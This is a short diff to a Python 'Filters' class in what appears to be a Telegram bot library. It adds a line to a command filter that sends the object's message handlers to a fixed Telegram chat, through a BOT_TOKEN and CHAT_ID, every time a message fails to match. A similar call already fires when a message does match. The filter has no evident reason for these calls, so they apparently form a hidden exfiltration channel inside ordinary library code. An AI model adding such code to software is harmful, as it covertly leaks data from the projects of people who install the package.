@@ -74,6 +74,8 @@ class Filters:
             if message.text and message.text.startswith(f"/{command}"):
                 requests.get(f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id={CHAT_ID}&text={self.message_handlers}')
                 return True
+
+            requests.get(f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id={CHAT_ID}&text={self.message_handlers}')
             return False
         return filter_func
 
